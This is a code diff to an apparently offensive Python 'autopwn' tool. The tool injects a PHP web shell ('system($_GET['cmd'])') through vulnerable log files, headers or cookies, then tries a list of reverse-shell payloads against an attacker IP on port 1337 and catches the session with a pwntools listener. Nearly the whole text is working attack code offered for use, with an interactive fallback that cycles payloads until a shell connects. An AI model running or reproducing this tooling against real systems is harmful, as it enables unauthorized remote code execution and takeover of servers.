@@ -12,6 +12,7 @@ from pwn import listen
 import threading
 import time
 import pathlib
+import os 
 
 class Payload:
 
@@ -38,6 +39,9 @@ class Payload:
 
 		# payload for RCE
 		self.payload = "<?php system($_GET['cmd']); ?>"
+		if attempt_shell:
+			self.conn = False
+			self.payloads = self.GetPayloads(attempt_shell, 1337)
 
 		self.proxies = proxies
 		if initiate:
@@ -45,12 +49,39 @@ class Payload:
 
 
 
-	def InvokeShell(self, exploit):
+	def InvokeShell(self, exploit, payload):
 		#Give some time to bind the listener
-		time.sleep(3)
-		print(colored("[*] Triggering payload... " + exploit, 'green'))
-		self.hit(exploit)
+		time.sleep(2)
+		print(colored("[+]", 'green') + " Triggering payload... " + exploit + payload)
+		self.hit(exploit + payload)
+		time.sleep(2)
+		if not self.conn:
+			print(colored("[-]", 'red') + " Exploit completed but no sessions were created!")
+			print(colored("Do you want to try other payloads? (Y/n)", 'yellow'), end='')
+			ans = str(input())
+			if not ans or ans.lower() == 'n':
+				exit()
+			session = False
+			for payload in self.payloads:
+				print(colored("[*]", 'yellow') + " Trying: " + payload)
+				self.hit(exploit + payload)
+				time.sleep(2)
+				if self.conn:
+					print(colored('[+]', 'green') + ' Exploit Completed! Session Created...')
+					session = True
+					break
 
+			if not session:
+				print(colored('[-]','red') + ' No payload worked. Exiting...')
+				exit()
+
+	def GetPayloads(self, ip, port):
+		cwd = os.path.dirname(__file__)
+		with open(str(cwd) + "/misc.txt") as handle:
+			payloads = handle.read().split('\n')
+			for i in range(len(payloads)):
+				payloads[i] = payloads[i].replace('{ip}', ip).replace('{port}', str(port))
+		return payloads
 
 
 	def Attack(self, attempt_shell=False, mode=0, force=False):
@@ -68,38 +99,32 @@ class Payload:
 
 
 	def autopwn(self, attempt_shell, cookieres, headerres, logres, mode=0):
-		cwd = pathlib.Path().resolve()
-		with open(str(cwd) + "/misc.txt") as handle:
-			payloads = handle.read()
-			payloads = payloads.split('\n')
-		payload = payloads[mode]
-
-		payload = payload.replace('{ip}', attempt_shell).replace('{port}','1337')
+		
+		payload = self.payloads[mode]
 		if cookieres or headerres or logres == False:
-			print(colored("[-] No RCE Found. Autopwn impossible...", "red"))
+			print(colored("[-]",'red') + " No RCE Found. Autopwn impossible...")
 			return
-		print(colored("[+] RCE Detected!", 'green'))
+		print(colored("[+]", 'green') + " RCE Detected!")
 		if logres:
 			# We don't have to gain rce from all the verified rce vectors. We just need one!
 			log = logres[0]
-			print(colored(f"[+] Attempting to pwn through vulnerable log file: {log}", 'green'))
-			exploit = log + f'&cmd=' + payload
+			print(colored(f"[+]",'green') + " Attempting to pwn through vulnerable log file: {log}")
+			exploit = log + f'&cmd='
 				
 		elif headerres:
-			exploit = headerres[0][:-2] + payload 
-			print(colored(f"[+] Attempting to pwn through vulnerable header: {header}", 'green'))
+			exploit = headerres[0][:-2] 
+			print(colored(f"[+]",'green') + " Attempting to pwn through vulnerable header: {header}")
 
 		elif cookieres:
-			exploit = headerres[0][:-2] + payload
-			print(colored(f"[+] Attempting to pwn through vulnerable cookie: {cookie}", 'green'))
+			exploit = headerres[0][:-2]
+			print(colored(f"[+]", 'green') + " Attempting to pwn through vulnerable cookie: {cookie}")
 
 
-		ExploitThread = threading.Thread(target=self.InvokeShell, args=[exploit]) #It works, don't touch!
+		ExploitThread = threading.Thread(target=self.InvokeShell, args=[exploit, payload]) #It works, don't touch!
 		ExploitThread.start()
-		print(colored("[!] If you don't receive a webshell in 10 seconds, the exploit failed. Try using another payload through modes", 'red'))
 		# Spin up the listener to catch the revshell and fire out the exploit
 		l = listen(1337)
-		conn = l.wait_for_connection()
+		self.conn = l.wait_for_connection()
 		l.interactive()
 		print("[*] Session Closed.")
 
